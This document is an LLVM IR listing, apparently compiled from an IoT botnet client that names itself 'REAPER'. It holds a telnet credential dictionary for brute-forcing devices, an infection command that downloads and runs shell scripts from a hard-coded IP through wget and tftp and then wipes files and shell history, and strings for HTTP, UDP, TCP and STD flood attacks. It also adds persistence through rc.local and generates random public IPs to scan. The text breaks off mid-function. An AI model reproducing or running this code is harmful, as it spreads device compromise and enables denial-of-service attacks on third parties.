@.str.274 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.275 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.276 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.277 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.278 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.279 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.280 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.281 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.282 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.283 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.284 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.285 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.286 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.287 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.288 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.289 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.290 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.291 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.292 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.293 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.294 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.295 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.296 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
@.str.297 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.298 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.299 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.300 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.301 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.302 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.303 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.304 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.305 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.306 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@AllDemDupes = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.307, i32 0, i32 0)], align 8
@.str.307 = private unnamed_addr constant [16 x i8] c"70.32.30.177:23\00", align 1
@infect = global i8* getelementptr inbounds ([311 x i8], [311 x i8]* @.str.308, i32 0, i32 0), align 8
@.str.308 = private unnamed_addr constant [311 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://70.32.30.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 70.32.30.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 70.32.30.177; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@usernames = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.309 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.311 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.312 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.313 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.314 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.315 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.316 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.317 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@HeliosCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.327, i32 0, i32 0), i8* null], align 16
@.str.318 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.322 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.323 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.325 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.331, i32 0, i32 0), i8* null], align 16
@.str.328 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.329 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.330 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.331 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* null], align 16
@.str.332 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.336 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.338 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@.str.339 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.340 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.341 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.423 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.342 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.344 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.345 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GetRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.346 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.347 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.348 = private unnamed_addr constant [93 x i8] c"\1B[1;33mLogin Found \1B[1;31mAttempting To Brute \1B[1;30mLIKE A GOD!!! IP:%s User:%s Pass:%s\1B[0m\00", align 1
@.str.349 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0)], align 16
@.str.351 = private unnamed_addr constant [5 x i8] c"REAP\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"AWS\00", align 1
@.str.354 = private unnamed_addr constant [9 x i8] c"AWSPANEL\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"COCAINE\00", align 1
@.str.356 = private unnamed_addr constant [6 x i8] c"INSTA\00", align 1
@.str.357 = private unnamed_addr constant [16 x i8] c"FLEXINGONLAMERS\00", align 1
@.str.358 = private unnamed_addr constant [7 x i8] c"NULLME\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"STDMETH\00", align 1
@.str.360 = private unnamed_addr constant [9 x i8] c"BUTTHOLE\00", align 1
@.str.361 = private unnamed_addr constant [9 x i8] c"urnangay\00", align 1
@.str.362 = private unnamed_addr constant [7 x i8] c"vegena\00", align 1
@.str.363 = private unnamed_addr constant [5 x i8] c"no u\00", align 1
@.str.364 = private unnamed_addr constant [17 x i8] c"ovhhasalilweiner\00", align 1
@.str.365 = private unnamed_addr constant [17 x i8] c"TRAPNMODSISASKID\00", align 1
@.str.366 = private unnamed_addr constant [10 x i8] c"DANKPOWER\00", align 1
@.str.367 = private unnamed_addr constant [7 x i8] c"udpcri\00", align 1
@.str.368 = private unnamed_addr constant [7 x i8] c"STDCRI\00", align 1
@.str.369 = private unnamed_addr constant [15 x i8] c"NFOServers.com\00", align 1
@.str.370 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.371 = private unnamed_addr constant [6 x i8] c"haxor\00", align 1
@.str.372 = private unnamed_addr constant [15 x i8] c"aws.amazon.com\00", align 1
@.str.373 = private unnamed_addr constant [9 x i8] c"slav.com\00", align 1
@.str.374 = private unnamed_addr constant [9 x i8] c"AWS Menu\00", align 1
@.str.375 = private unnamed_addr constant [9 x i8] c"ganggang\00", align 1
@.str.376 = private unnamed_addr constant [10 x i8] c"instagram\00", align 1
@.str.377 = private unnamed_addr constant [6 x i8] c"rand0\00", align 1
@.str.378 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.379 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.380 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.381 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.382 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.383 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.384 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.385 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.387 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.388 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.389 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.391 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.392 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.393 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.394 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.396 = private unnamed_addr constant [6 x i8] c"PUSSY\00", align 1
@.str.397 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.398 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.399 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.400 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.401 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.402 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.403 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.404 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.406 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.407 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.409 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.410 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.411 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.412 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.413 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.415 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.416 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.417 = private unnamed_addr constant [159 x i8] c"\1B[1;37m[\1B[0;31mREAPER\1B[1;37m] \1B[1;36mDevices Loading\1B[1;37m ~> [IP] ~> [\1B[1;33m%s\1B[1;37m] ~> [BUILD] ~> [\1B[1;35mArch:%s\1B[1;37m] ~> [\1B[1;32mLOADED\1B[1;37m]\1B[34m\00", align 1
@.str.418 = private unnamed_addr constant [9 x i8] c"LELIMDUP\00", align 1
@.str.419 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.420 = private unnamed_addr constant [11 x i8] c"STOLENBOTS\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.422 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, -1640531527
  %7 = sub i32 %5, %6
  %8 = add i32 %5, -1640531527
  store i32 %7, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %9 = load i32, i32* %2, align 4
  %10 = sub i32 0, %9
  %11 = sub i32 0, -1640531527
  %12 = add i32 %10, %11
  %13 = sub i32 0, %12
  %14 = add i32 %9, -1640531527
  %15 = sub i32 0, %13
  %16 = sub i32 0, -1640531527
  %17 = add i32 %15, %16
  %18 = sub i32 0, %17
  %19 = add i32 %13, -1640531527
  store i32 %18, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %20

; <label>:20:                                     ; preds = %71, %1
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 4096
  br i1 %22, label %23, label %76

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* %3, align 4
  %25 = sub i32 %24, 1233304337
  %26 = sub i32 %25, 3
  %27 = add i32 %26, 1233304337
  %28 = sub nsw i32 %24, 3
  %29 = sext i32 %27 to i64
